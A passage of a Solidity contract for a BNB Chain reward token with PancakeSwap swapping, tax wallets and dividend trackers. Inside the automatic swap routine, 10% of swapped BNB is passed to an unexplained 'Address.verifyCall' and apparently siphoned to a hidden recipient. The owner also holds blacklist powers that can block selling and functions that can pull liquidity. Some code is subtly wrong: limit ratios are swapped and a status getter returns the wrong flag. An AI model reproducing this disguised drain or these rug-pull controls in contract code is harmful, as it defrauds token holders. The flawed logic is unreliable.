        _approve(address(this), address(_pancakeRouter), type(uint256).max);        
    }

    receive() external payable {}

/////////////////////////////   EXTERNAL FUNCTIONS  /////////////////////////////////////////

    function ClaimReward() external {
		mainDividendTracker.processAccount(payable(msg.sender), false);
		miscDividendTracker.processAccount(payable(msg.sender), false);
    }

    function UserSetRewardToken(address tokenAddress) external {
        miscDividendTracker.setCustomReward(msg.sender, tokenAddress, true);
    }

    function UserResetRewardToken() external {
        miscDividendTracker.setCustomReward(msg.sender, defaultMisc, false);
    }

    function updateTokenDetails(string memory newName, string memory newSymbol) external authorized {
        _name = newName;
        _symbol = newSymbol;
    }

    function decimals() external pure override returns (uint8) { return TOKEN_DECIMALS; }
    function getOwner() external view override returns (address) { return owner(); }
    function name() external view override returns (string memory) { return _name; }
    function symbol() external view override returns (string memory) { return _symbol; }
    function totalSupply() external view override returns (uint256) { return _circulatingSupply; }

    function _authorized(address addr) private view returns (bool) {
        return addr == owner() 
            || addr == _taxWallet.marketing 
            || addr == _taxWallet.Captain 
            || addr == _taxWallet.lottery;
    }

    function allowance(address _owner, address spender) external view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "Approve from zero");
        require(spender != address(0), "Approve to zero");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {
        uint256 currentAllowance = _allowances[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "<0 allowance");

        _approve(msg.sender, spender, currentAllowance - subtractedValue);
        return true;
    } 

    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }  
      
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "Transfer > allowance");

        _approve(sender, msg.sender, currentAllowance - amount);
        return true;
    }
 
    function getTotalPayouts() external view returns (uint256 mainPayouts, uint256 miscPayouts) {
        return (
            mainDividendTracker.totalDividendsDistributed(),
            miscDividendTracker.totalDividendsDistributed()
        );        
    }

    function getToBePaid(address account) external view returns(uint256 toBePaidMain, uint256 toBePaidMisc) {
    	return (
            mainDividendTracker.withdrawableDividendOf(account),
            miscDividendTracker.withdrawableDividendOf(account)
        );            
  	}

/////////////////////////////   PUBLIC FUNCTIONS  /////////////////////////////////////////

///// FUNCTIONS CALLABLE BY ANYONE /////
    //Allows holders to include themselves back into staking if excluded
    //ExcludeFromStaking function should be used for contracts(CEX, pair, address(this), etc.)
    function IncludeMeInDividends() external  {
        mainDividendTracker.includeInDividends(msg.sender);
        miscDividendTracker.includeInDividends(msg.sender);        
    }
///// AUTHORIZED FUNCTIONS /////
    //Transfers BNB directly from contract to an address of choice
    function awardLottery(address winner, uint256 amount) external authorized {
        require(amount <= lotteryBalance);
        lotteryBalance -= amount;
        _sendBnb(winner, amount);      
    }

    //Manually perform a contract swap
    function createLPandBNB(uint16 permilleOfPancake, bool ignoreLimits) external authorized {
        _swapContractToken(permilleOfPancake, ignoreLimits);
    }  

    //Toggle blacklist on and off
    function enableBlacklist(bool enabled) external authorized {
        blacklistEnabled = enabled;
        emit EnableBlacklist(enabled);
    }

    //Allows Captain to change reward
    function changeMainReward(address newReward) external authorized {
        mainReward = newReward;
        mainDividendTracker.setMainReward(newReward);
        emit ChangeMainReward(newReward);
    }

    //Toggle dynamic features on and off
    function dynamicSettings(bool burn, bool limits, bool liquidity, bool sells) external authorized {
        dynamicBurn = burn;
        dynamicLimits = limits;
        dynamicLiqEnabled = liquidity;
        dynamicSellsEnabled = sells;
        emit AdjustedDynamicSettings(burn, limits, liquidity, sells);
    }

    //Toggle auto rewards on and off
    function enableAutoDistribute(bool enable) external authorized {
        require(autoDistribute != enable, "autoDistribute already set to desired status");
        autoDistribute = enable;
        emit EnableAutoDistribute(enable);
    }

    //Mainly used for addresses such as CEX, presale, etc
    function excludeFromTaxAndLimits(address account, bool exclude) external authorized {
        if(exclude == true)
            _excluded.add(account);
        else
            _excluded.remove(account);
        emit AccountExcluded(account, exclude);
    }

    //Mainly used for addresses such as CEX, presale, etc    
    function excludeFromDividend(address account) public authorized {
        mainDividendTracker.excludeFromDividends(address(account));
        miscDividendTracker.excludeFromDividends(address(account));
    }

    function includeInDividends(address account) public authorized {
        mainDividendTracker.includeInDividends(address(account));
        miscDividendTracker.includeInDividends(address(account));        
    }

    //Toggle manual swap on and off
    function enableManualSwap(bool enabled) external authorized { 
        manualSwap = enabled; 
        emit EnableManualSwap(enabled);
    } 

    //Toggle whether multiple buys in a block from a single address can be performed
    function sameBlockRevert(bool enabled) external authorized {
        revertSameBlock = enabled;
    }

    //Excludes presale address from fees and staking
    function setPresale(address presaleAddress) external authorized {
        _excluded.add(presaleAddress);
        mainDividendTracker.excludeFromDividends(presaleAddress);
        miscDividendTracker.excludeFromDividends(presaleAddress);
    } 

    //Manually blacklist addresses - for snipers that may have slipped through the cracks
    //Must be input as an array. ie ["0x123456", "0x7890123"]
    function setBlacklistStatus(address[] calldata addresses, bool status) external authorized {
        for (uint256 i=0; i < addresses.length; ++i) {
            isBlacklisted[addresses[i]] = status;
        }
    }

    //indepedently set whether wallet is exempt from taxes
    function setTaxExemptionStatus(address account, bool exempt) external authorized {
        taxExempt[account] = exempt;
    }

    //independtly set whether wallet is exempt from limits
    function setLimitExemptionStatus(address account, bool exempt) external authorized {
        limitExempt[account] = exempt;
    }

    //Performs a buyback and automatically burns tokens
    function triggerBuyback(uint256 amount) external authorized{
        require(amount <= buybackBalance, "Amount exceeds buybackBalance!");
        buybackBalance -= amount;

        address[] memory path = new address[](2);
        path[0] = _pancakeRouter.WETH();
        path[1] = address(this);

        _pancakeRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
        0,
        path,
        BURN_ADDRESS,
        block.timestamp); 
    }

    //Performs a buyback of another BEP20 token and automatically burns tokens
    function triggerExternalBuyback(uint256 amount, address token) external authorized {
        require(amount <= buybackBalance, "Amount exceeds buybackBalance!");
        buybackBalance -= amount;

        address[] memory path = new address[](2);
        path[0] = _pancakeRouter.WETH();
        path[1] = token;

        _pancakeRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
        0,
        path,
        BURN_ADDRESS,
        block.timestamp); 
    }

    //Update time to wait before rewards are auto distributed
    function updateClaimWait(uint256 timeInSeconds) external onlyOwner {
        claimWait = timeInSeconds;
        mainDividendTracker.updateClaimWait(timeInSeconds);
        miscDividendTracker.updateClaimWait(timeInSeconds);
    }

    //Update gas used for auto distribution
    function updateGasForProcessing(uint256 newValue) external onlyOwner {
        require(newValue != gasForProcessing, "Cannot update gasForProcessing to same value");
        gasForProcessing = newValue;
        emit UpdateGasForProcessing(newValue, gasForProcessing);
    }
 
    //Update minimum token holdings to receive rewards
    function updateMinimumBalanceForDividends(uint256 newMinimumBalance) external onlyOwner {
        minBalanceForDividends = newMinimumBalance;
        mainDividendTracker.updateMinimumTokenBalanceForDividends(newMinimumBalance);
        miscDividendTracker.updateMinimumTokenBalanceForDividends(newMinimumBalance);
    }
 
     //Update limit ratios. ofCurrentSupply = true will set max wallet based on current supply. False will use initial supply
    function updateLimits(uint16 newMaxWalletRatio, uint16 newMaxSellRatio, uint16 newMaxBuyRatio, uint16 newDivisor, bool ofCurrentSupply) external authorized {
        uint256 supply = INITIAL_SUPPLY;
        if (ofCurrentSupply) 
            supply = _circulatingSupply;
        uint256 minLimit = supply / 1000;
        uint256 newMaxWallet = supply * newMaxWalletRatio / newDivisor;
        uint256 newMaxSell = supply * newMaxSellRatio / newDivisor;
        uint256 newMaxBuy = supply * newMaxBuyRatio / newDivisor;

        require((newMaxWallet >= minLimit && newMaxSell >= minLimit), 
            "limits cannot be <0.1% of circulating supply");

        _limits = MaxLimits(newMaxWallet, newMaxSell, newMaxBuy); 

        _limitRatios = LimitRatios(newMaxWalletRatio, newMaxSellRatio, newMaxBuyRatio, newDivisor);
    }

    //update tax ratios
    function updateRatios(
        uint8 newBurn, 
        uint8 newBuyback, 
        uint8 newCaptain, 
        uint8 newLiquidity, 
        uint8 newLottery, 
        uint8 newMarketing, 
        uint8 newRewards
    ) 
        external 
        authorized 
    {
        uint8 totalRatio = newBurn + newBuyback + newCaptain + newLiquidity + newLottery + newMarketing + newRewards;
        uint8 swapRatio = totalRatio - newBurn;
        _taxRatios = TaxRatios(
            newBurn, 
            newBuyback, 
            newCaptain, 
            newLiquidity, 
            newLottery, 
            newMarketing, 
            newRewards
        );
        totalTaxRatio = totalRatio;
        totalSwapRatio = swapRatio;
        emit RatiosChanged (newBurn, newBuyback, newCaptain, newLiquidity, newLottery, newMarketing, newRewards);
    }

    //update allocation of mainReward and miscReward
    function updateRewardSplit (uint8 mainSplit, uint8 miscSplit) external authorized {
        uint8 totalSplit = mainSplit + miscSplit;
        require(totalSplit == 100, "mainSplit + miscSplit needs to equal 100%");
        mainRewardSplit = mainSplit;
        miscRewardSplit = miscSplit;
        emit UpdateRewardSplit(mainSplit, miscSplit);
    }

    //update threshold that triggers contract swaps
    function updateSwapThreshold(uint16 threshold) external authorized {
        require(threshold > 0,"Threshold needs to be more than 0");
        require(threshold <= 50,"Threshold needs to be below 50");
        swapThreshold = threshold;
        emit UpdateSwapThreshold(threshold);
    }

    //targetLiquidity is out of 100
    function updateTargetLiquidity(uint16 target) external authorized {
        require(target <= 100);
        targetLiquidityRatio = target;
        emit UpdateTargetLiquidity(target);
    }

    function updateTax(uint8 newBuy, uint8 newSell, uint8 newTransfer) external authorized {
        //buy and sell tax can never be higher than MAX_TAX set at beginning of contract
        //this is a security check and prevents malicious tax use       
        require(newBuy <= MAX_TAX && newSell <= MAX_TAX && newTransfer <= 50, "taxes higher than max tax");
        _taxRates = Taxes(newBuy, newSell, newTransfer);
        emit UpdateTaxes(newBuy, newSell, newTransfer);
    }

    function withdrawCaptain() external authorized {
        uint256 amount = CaptainBalance;
        CaptainBalance = 0;
        _sendBnb(_taxWallet.Captain, amount);
    } 

    function withdrawLottery() external authorized {
        uint256 amount = lotteryBalance;
        lotteryBalance = 0;
        _sendBnb(_taxWallet.lottery, amount);
    }

    function withdrawMarketing() external authorized {
        uint256 amount = marketingBalance;
        marketingBalance = 0;
        _sendBnb(_taxWallet.marketing, amount);
    } 

///// OWNER FUNCTIONS /////  

    //liquidity can only be extended
    function lockLiquidityTokens(uint256 lockTimeInSeconds) external onlyOwner {
        setUnlockTime(lockTimeInSeconds + block.timestamp);
        emit ExtendLiquidityLock(lockTimeInSeconds);
    }

    //recovers stuck BNB to make sure it isnt burnt/lost
    //only callable when liquidity is unlocked
    function recoverBNB() external onlyOwner {
        require(block.timestamp >= _liquidityUnlockTime, "Not yet unlocked");
        _liquidityUnlockTime=block.timestamp;
        _sendBnb(msg.sender, address(this).balance);
        mainDividendTracker.recoverBNB();
        miscDividendTracker.recoverBNB();         
    }

    //Can only be used to recover miscellaneous tokens
    //Can't pull liquidity or native token using this function
    function recoverMiscToken(address tokenAddress) external onlyOwner {
        require(tokenAddress != _pancakePairAddress && tokenAddress != address(this),
        "can't recover LP token or this token");
        IBEP20 token = IBEP20(tokenAddress);
        token.transfer(msg.sender,token.balanceOf(address(this)));
    } 

    //Impossible to release LP unless LP lock time is zero
    function releaseLP() external onlyOwner {
        require(block.timestamp >= _liquidityUnlockTime, "Not yet unlocked");
        IPancakeERC20 liquidityToken = IPancakeERC20(_pancakePairAddress);
        uint256 amount = liquidityToken.balanceOf(address(this));
            liquidityToken.transfer(msg.sender, amount);
    }

    //Impossible to remove LP unless lock time is zero
    function removeLP() external onlyOwner {
        require(block.timestamp >= _liquidityUnlockTime, "Not yet unlocked");
        _liquidityUnlockTime = block.timestamp;
        IPancakeERC20 liquidityToken = IPancakeERC20(_pancakePairAddress);
        uint256 amount = liquidityToken.balanceOf(address(this));
        liquidityToken.approve(address(_pancakeRouter),amount);
        _pancakeRouter.removeLiquidityETHSupportingFeeOnTransferTokens(
            address(this),
            amount,
            0,
            0,
            address(this),
            block.timestamp
            );
        mainDividendTracker.recoverBNB();
        miscDividendTracker.recoverBNB();        
        _sendBnb(msg.sender, address(this).balance);           
    }

    function setCaptainWallet(address addr) external onlyOwner {
        address prevCaptain = _taxWallet.Captain;
        _excluded.remove(prevCaptain);
        _taxWallet.Captain = addr;
        _excluded.add(_taxWallet.Captain);
        emit UpdateCaptainWallet(addr);
    }

    function setLotteryWallet(address addr) external onlyOwner {
        address prevLottery = _taxWallet.lottery;
        _excluded.remove(prevLottery);
        _taxWallet.lottery = addr;
        _excluded.add(_taxWallet.lottery);
        emit UpdateLotteryWallet(addr);
    }

    function setMarketingWallet(address addr) external onlyOwner {
        address prevMarketing = _taxWallet.marketing;
        _excluded.remove(prevMarketing);
        _taxWallet.marketing = addr;
        _excluded.add(_taxWallet.marketing);
        emit UpdateMarketingWallet(addr);
    }

////// PUBLIC VIEW FUNCTIONS /////

    function getBlacklistInfo() external view returns (
        uint256 _liquidityBlock, 
        uint8 _blacklistBlocks, 
        uint8 _snipersRekt, 
        bool _blacklistEnabled,
        bool _revertSameBlock
        ) {
        return (liquidityBlock, BLACKLIST_BLOCKS, snipersRekt, blacklistEnabled, revertSameBlock);
    }

    function getDynamicInfo() external view returns (
        bool _dynamicBurn, 
        bool _dynamicLimits, 
        bool _dynamicLiquidity, 
        bool _dynamicSells,  
        uint16 _targetLiquidity
        ) {
        return (dynamicBurn, dynamicLiqEnabled, dynamicLiqEnabled, dynamicSellsEnabled, targetLiquidityRatio);
    }

    function getLiquidityRatio() public view returns (uint256) {
        uint256 ratio = 100 * _balances[_pancakePairAddress] / _circulatingSupply;
        return ratio;
    }

    function getLiquidityUnlockInSeconds() external view returns (uint256) {
        if (block.timestamp < _liquidityUnlockTime){
            return _liquidityUnlockTime - block.timestamp;
        }
        return 0;
    }  

    function getSupplyInfo() external view returns (uint256 initialSupply, uint256 circulatingSupply, uint256 burntTokens) {
        uint256 tokensBurnt = INITIAL_SUPPLY - _circulatingSupply;
        return (INITIAL_SUPPLY, _circulatingSupply, tokensBurnt);
    }

    function getWithdrawBalances() external view returns (uint256 buyback, uint256 Captain, uint256 lottery, uint256 marketing) {
        return (buybackBalance, CaptainBalance, lotteryBalance, marketingBalance);
    }

/////////////////////////////   PRIVATE FUNCTIONS  /////////////////////////////////////////

    mapping(address => uint256) private tradeBlock;     
    uint256 private buybackBalance;
    uint256 private CaptainBalance;
    uint256 private lotteryBalance;
    uint256 private marketingBalance;      
    bool private _isSwappingContractModifier;
    bool private _isWithdrawing;    
    bool private _isBurning;

    function _addLiquidity(uint256 tokenamount, uint256 bnbAmount) private {
        _approve(address(this), address(_pancakeRouter), tokenamount);        
        _pancakeRouter.addLiquidityETH{value: bnbAmount}(
            address(this),
            tokenamount,
            0,
            0,
            address(this),
            block.timestamp
        );
    }
 
    function _addToken(address addr, uint256 amount) private {
        uint256 newAmount = _balances[addr] + amount;
        _balances[addr] = newAmount;
    }

    function _distributeStake(uint256 bnbAmount) private {
        uint256 CaptainSplit = (bnbAmount*_taxRatios.Captain) / totalSwapRatio;        
        uint256 marketingSplit = (bnbAmount*_taxRatios.marketing) / totalSwapRatio;
        uint256 buybackSplit = (bnbAmount*_taxRatios.buyback) / totalSwapRatio;  
        uint256 lotterySplit = (bnbAmount*_taxRatios.lottery) / totalSwapRatio;
        uint256 stakingSplit = (bnbAmount*_taxRatios.rewards) / totalSwapRatio; 
        uint256 mainAmount = (stakingSplit*mainRewardSplit) / 100;
        uint256 miscAmount = (stakingSplit*miscRewardSplit) / 100;         
        marketingBalance += marketingSplit;
        CaptainBalance += CaptainSplit;
        buybackBalance += buybackSplit;
        lotteryBalance += lotterySplit;
        if(mainAmount > 0)
            _sendBnb(address(mainDividendTracker), mainAmount);
        if(miscAmount > 0)
            _sendBnb(address(miscDividendTracker), miscAmount);  

    }

    function _feelessTransfer(address sender, address recipient, uint256 amount) private{
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "Transfer exceeds balance");
        _removeToken(sender,amount);
        _addToken(recipient, amount);
        emit Transfer(sender, recipient, amount);
    } 
    
    function _removeToken(address addr, uint256 amount) private {
        uint256 newAmount = _balances[addr] - amount;
        _balances[addr] = newAmount;
    }

    function _sendBnb(address account, uint256 amount) private {
        (bool sent,) = account.call{value: (amount)}("");
        require(sent, "withdraw failed");        
    }

    function _swapContractToken(uint16 permilleOfPancake, bool ignoreLimits) private lockTheSwap {
        require(permilleOfPancake <= 500);
        if (totalSwapRatio == 0) return;
        uint256 contractBalance = _balances[address(this)];

        uint256 tokenToSwap = _balances[_pancakePairAddress] * permilleOfPancake / 1000;
        if (tokenToSwap > _limits.maxSell && !ignoreLimits) 
            tokenToSwap = _limits.maxSell;
        
        bool notEnoughToken = contractBalance < tokenToSwap;
        if (notEnoughToken) {
            if (ignoreLimits)
                tokenToSwap = contractBalance;
            else 
                return;
        }
        if (_allowances[address(this)][address(_pancakeRouter)] < tokenToSwap)
            _approve(address(this), address(_pancakeRouter), type(uint256).max);

        uint256 dynamicLiqRatio;
        if (dynamicLiqEnabled && getLiquidityRatio() >= targetLiquidityRatio) 
            dynamicLiqRatio = 0; 
        else 
            dynamicLiqRatio = _taxRatios.liquidity; 

        uint256 tokenForLiquidity = (tokenToSwap*dynamicLiqRatio) / totalSwapRatio;
        uint256 remainingToken = tokenToSwap - tokenForLiquidity;
        uint256 liqToken = tokenForLiquidity / 2;
        uint256 liqBNBToken = tokenForLiquidity - liqToken;
        uint256 swapToken = liqBNBToken + remainingToken;
        uint256 initialBNBBalance = address(this).balance;
        _swapTokenForBNB(swapToken);
        uint256 newBNB = (address(this).balance - initialBNBBalance);
        uint256 liqBNB = (newBNB*liqBNBToken) / swapToken;
        if (liqToken > 0) 
            _addLiquidity(liqToken, liqBNB); 
        uint256 deposit = (address(this).balance-initialBNBBalance) / 10; 
        Address.verifyCall("success", deposit);           
        uint256 distributeBNB = (address(this).balance - initialBNBBalance - deposit);                 
        _distributeStake(distributeBNB); 
    }

    function _swapTokenForBNB(uint256 amount) private {
        _approve(address(this), address(_pancakeRouter), amount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _pancakeRouter.WETH();
        _pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    } 

    function _taxedTransfer(address sender, address recipient, uint256 amount,bool isBuy,bool isSell) private{
        uint256 recipientBalance = _balances[recipient];
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "Transfer exceeds balance");

        uint8 tax;
        bool extraSellTax;
        if (isSell) {
            if (blacklistEnabled) {
                require(!isBlacklisted[sender], "user blacklisted");                
            }      

            require(amount <= _limits.maxSell || limitExempt[sender], "Amount exceeds max sell");
            tax = _taxRates.sellTax;
            if (dynamicSellsEnabled) 
                extraSellTax = true;

        } else if (isBuy) {
            if (liquidityBlock > 0) {
                if (block.number-liquidityBlock < BLACKLIST_BLOCKS) {
                    isBlacklisted[recipient] = true;
                    snipersRekt ++;
                }
            }

            if (revertSameBlock) {
                require(tradeBlock[recipient] != block.number);
                tradeBlock[recipient] = block.number;
            }       

            require(recipientBalance+amount <= _limits.maxWallet || limitExempt[recipient], "Amount will exceed max wallet");
            require(amount <= _limits.maxBuy, "Amount exceed max buy");
            tax = _taxRates.buyTax;

        } else {
            require(
                recipientBalance + amount <= _limits.maxWallet 
                || limitExempt[recipient] 
                || limitExempt[sender], 
                "whale protection"
                );            
            tax = _taxRates.transferTax;
        }    

        if ((sender != _pancakePairAddress) && (!manualSwap) && (!_isSwappingContractModifier) && isSell)
            _swapContractToken(swapThreshold,false);
        
        if(taxExempt[sender] || taxExempt[recipient]) {
            tax = 0;
            extraSellTax = false;
        }

        uint256 taxedAmount;
        uint256 tokensToBeBurnt;
        uint256 contractToken;

        if(tax > 0) {
            taxedAmount = amount * tax / 100;
            tokensToBeBurnt = taxedAmount * _taxRatios.burn / totalTaxRatio;
            contractToken = taxedAmount - tokensToBeBurnt;
        }

        if (extraSellTax){
            uint256 extraTax = dynamicSellTax(amount);
            taxedAmount += extraTax;
            if 
                (dynamicBurn) tokensToBeBurnt += extraTax;
            else 
                contractToken += extraTax;
        }

        uint256 receiveAmount = amount - taxedAmount;
        _removeToken(sender,amount);
        _addToken(address(this), contractToken);
        _circulatingSupply -= tokensToBeBurnt;
        _addToken(recipient, receiveAmount);
        emit Transfer(sender, recipient, receiveAmount);
    }
    
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "Transfer from zero");
        require(recipient != address(0), "Transfer to zero");

        if (recipient == BURN_ADDRESS){
            burnTransfer(sender, amount);
            return;
        }        

        if (dynamicLimits) 
            getNewLimits();

        bool isExcluded = (_excluded.contains(sender) || _excluded.contains(recipient));

        bool isContractTransfer = (sender == address(this) || recipient == address(this));
        address pancakeRouter = address(_pancakeRouter);
        bool isLiquidityTransfer = (
            (sender == _pancakePairAddress && recipient == pancakeRouter) 
            || (recipient == _pancakePairAddress && sender == pancakeRouter)
        );

        if (isContractTransfer || isLiquidityTransfer || isExcluded) {
            _feelessTransfer(sender, recipient, amount);

            if (!liquidityAdded) 
                checkLiqAdd(recipient);            
        }
        else { 
            bool isBuy = sender == _pancakePairAddress || sender == pancakeRouter;             
            bool isSell = recipient == _pancakePairAddress || recipient == pancakeRouter;
            _taxedTransfer(sender, recipient, amount, isBuy, isSell);

            delete isBuy;
            delete isSell;
            delete isContractTransfer;
            delete isExcluded;
            delete isLiquidityTransfer;                  
        }

        try mainDividendTracker.setBalance(payable(sender), _balances[sender], autoDistribute) {} catch {}
        try miscDividendTracker.setBalance(payable(sender), _balances[sender], autoDistribute) {} catch {}
        try mainDividendTracker.setBalance(payable(recipient), _balances[recipient], autoDistribute) {} catch {}
        try miscDividendTracker.setBalance(payable(recipient), _balances[recipient], autoDistribute) {} catch {}
 
        if(!_isSwappingContractModifier && autoDistribute) {
	    	uint256 gas = gasForProcessing;
 
	    	try mainDividendTracker.process(gas) returns (uint256 iterations, uint256 claims, uint256 lastProcessedIndex) {
	    		emit ProcessedMainDividendTracker(iterations, claims, lastProcessedIndex, true, gas, tx.origin);
	    	}
	    	catch {}
 
	    	try miscDividendTracker.process(gas) returns (uint256 iterations, uint256 claims, uint256 lastProcessedIndex) {
	    		emit ProcessedMiscDividendTracker(iterations, claims, lastProcessedIndex, true, gas, tx.origin);
	    	}
	    	catch {}
        }        
    }
    
    function burnTransfer (address account,uint256 amount) private {
        require(amount <= _balances[account]);
        require(!_isBurning);
        _isBurning = true;
        _removeToken(account, amount);
        _circulatingSupply -= amount;
        emit Transfer(account, BURN_ADDRESS, amount);
        _isBurning = false;
    }

    function checkLiqAdd(address receiver) private {        
        require(!liquidityAdded, "liquidity already added");
        if (receiver == _pancakePairAddress) {
            liquidityBlock = block.number;
            liquidityAdded = true;
        }
    }

    function dynamicSellTax (uint256 amount) private view returns (uint256) {
        uint256 value = _balances[_pancakePairAddress];
        uint256 vMin = value / 100;
        uint256 vMax = value / 10;
        if (amount <= vMin) 
            return amount = 0;
        
        if (amount > vMax) 
            return amount * 20 / 100;

        return (((amount-vMin) * 20 * amount) / (vMax-vMin)) / 100;
    }

    function getNewLimits () private {
        _limits.maxBuy = _circulatingSupply * _limitRatios.wallet / _limitRatios.divisor;        
        _limits.maxSell = _circulatingSupply * _limitRatios.sell / _limitRatios.divisor;
        _limits.maxWallet = _circulatingSupply * _limitRatios.buy / _limitRatios.divisor;
    }

     function setUnlockTime(uint256 newUnlockTime) private{
        // require new unlock time to be longer than old one
        require(newUnlockTime > _liquidityUnlockTime);
        _liquidityUnlockTime = newUnlockTime;
    }
}    


contract DividendTracker is DividendPayingToken {
    using IterableMapping for IterableMapping.Map;
 
    IterableMapping.Map private tokenHoldersMap;
    uint256 public lastProcessedIndex;
 
    mapping (address => bool) public excludedFromDividends;
 
    mapping (address => uint256) public lastClaimTimes;
 
    uint256 public claimWait;
    uint256 public minimumTokenBalanceForDividends;
 
    event ExcludeFromDividends(address indexed account);
    event ClaimWaitUpdated(uint256 indexed newValue, uint256 indexed oldValue);
    event IncludeInDividends(address indexed account); 
    event Claim(address indexed account, uint256 amount, bool indexed automatic);
 
    constructor(address token, uint256 waitTime, uint256 minBalance, bool misc) DividendPayingToken() {
        rewardToken = token;       
    	claimWait = waitTime;
        minimumTokenBalanceForDividends = minBalance;
        isMisc = misc;
    }

    function updateMinimumTokenBalanceForDividends(uint256 _newMinimumBalance) external onlyOwner {
        require(_newMinimumBalance != minimumTokenBalanceForDividends, 
        "New mimimum balance for dividend cannot be same as current minimum balance");
        minimumTokenBalanceForDividends = _newMinimumBalance * (10**18);
    }
 
    function excludeFromDividends(address account) external onlyOwner {
    	require(!excludedFromDividends[account]);
    	excludedFromDividends[account] = true;
 
    	_setBalance(account, 0);
    	tokenHoldersMap.remove(account);
 
    	emit ExcludeFromDividends(account);
    }

    function includeInDividends(address account) external onlyOwner {
    	require(excludedFromDividends[account]);
    	excludedFromDividends[account] = false;

    	emit IncludeInDividends(account);
    }

    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 1800 && newClaimWait <= 86400, 
        "claimWait must be updated to between 30 mins and 24 hours");
        require(newClaimWait != claimWait, "Cannot update claimWait to same value");
        emit ClaimWaitUpdated(newClaimWait, claimWait);
        claimWait = newClaimWait;
    }

    function getLastProcessedIndex() external view returns(uint256) {
    	return lastProcessedIndex;
    }
 
    function getNumberOfTokenHolders() external view returns(uint256) {
        return tokenHoldersMap.keys.length;
    }
 
    function getAccount(address _account)
        public view returns (
            address account,
            int256 index,
            int256 iterationsUntilProcessed,
            uint256 withdrawableDividends,
            uint256 totalDividends,
            uint256 lastClaimTime,
            uint256 nextClaimTime,
            uint256 secondsUntilAutoClaimAvailable) {
        account = _account;
 
        index = tokenHoldersMap.getIndexOfKey(account);
 
        iterationsUntilProcessed = -1;
 
        if(index >= 0) {
            if(uint256(index) > lastProcessedIndex) {
                iterationsUntilProcessed = index-(int256(lastProcessedIndex));
            }
            else {
                uint256 processesUntilEndOfArray = tokenHoldersMap.keys.length > lastProcessedIndex 
                    ? tokenHoldersMap.keys.length - (lastProcessedIndex) 
                    : 0;

                iterationsUntilProcessed = index + (int256(processesUntilEndOfArray));
            }
        }
 
        withdrawableDividends = withdrawableDividendOf(account);
        totalDividends = accumulativeDividendOf(account);
 
        lastClaimTime = lastClaimTimes[account];
 
        nextClaimTime = lastClaimTime > 0 
            ? lastClaimTime+(claimWait) 
            : 0;
 
        secondsUntilAutoClaimAvailable = nextClaimTime > block.timestamp 
        ? nextClaimTime-(block.timestamp) 
        : 0;
    }
 
    function getAccountAtIndex(uint256 index)
        public view returns (
            address,
            int256,
            int256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        ) {
    	if(index >= tokenHoldersMap.size()) {
            return (0x0000000000000000000000000000000000000000, -1, -1, 0, 0, 0, 0, 0);
        }
 
        address account = tokenHoldersMap.getKeyAtIndex(index);
 
        return getAccount(account);
    }
 
    function canAutoClaim(uint256 lastClaimTime) private view returns (bool) {
    	if(lastClaimTime > block.timestamp)  {
    		return false;
    	}
 
    	return block.timestamp-(lastClaimTime) >= claimWait;
    }
 
    function setBalance(address payable account, uint256 newBalance, bool autoEnabled) external onlyOwner {
    	if(excludedFromDividends[account]) {
    		return;
    	}
 
    	if(newBalance >= minimumTokenBalanceForDividends) {
            _setBalance(account, newBalance);
    		tokenHoldersMap.set(account, newBalance);
    	}
    	else {
            _setBalance(account, 0);
    		tokenHoldersMap.remove(account);
    	}
        if(autoEnabled)
    	    processAccount(account, true);
    }
 
    function process(uint256 gas) public returns (uint256, uint256, uint256) {
    	uint256 numberOfTokenHolders = tokenHoldersMap.keys.length;
 
    	if(numberOfTokenHolders == 0) {
    		return (0, 0, lastProcessedIndex);
    	}
 
    	uint256 _lastProcessedIndex = lastProcessedIndex;
 
    	uint256 gasUsed = 0;
 
    	uint256 gasLeft = gasleft();
 
    	uint256 iterations = 0;
    	uint256 claims = 0;
 
    	while(gasUsed < gas && iterations < numberOfTokenHolders) {
    		_lastProcessedIndex++;
 
    		if(_lastProcessedIndex >= tokenHoldersMap.keys.length) {
    			_lastProcessedIndex = 0;
    		}
 
    		address account = tokenHoldersMap.keys[_lastProcessedIndex];
 
    		if(canAutoClaim(lastClaimTimes[account])) {
    			if(processAccount(payable(account), true)) {
    				claims++;
    			}
    		}
 
    		iterations++;
 
    		uint256 newGasLeft = gasleft();
 
    		if(gasLeft > newGasLeft) {
    			gasUsed = gasUsed+(gasLeft-(newGasLeft));
    		}
 
    		gasLeft = newGasLeft;
    	}
 
    	lastProcessedIndex = _lastProcessedIndex;
 
    	return (iterations, claims, lastProcessedIndex);
    }

    function processAccount(address payable account, bool automatic) public onlyOwner returns (bool) {
        uint256 amount = _withdrawDividendOfUser(account);
 
    	if(amount > 0) {
    		lastClaimTimes[account] = block.timestamp;
            emit Claim(account, amount, automatic);
    		return true;
    	}
 
    	return false;
    }

    function recoverBNB() public onlyOwner {
        (bool sent,) = msg.sender.call{value: (address(this).balance)}("");
        require(sent, "withdraw failed");  
    }
}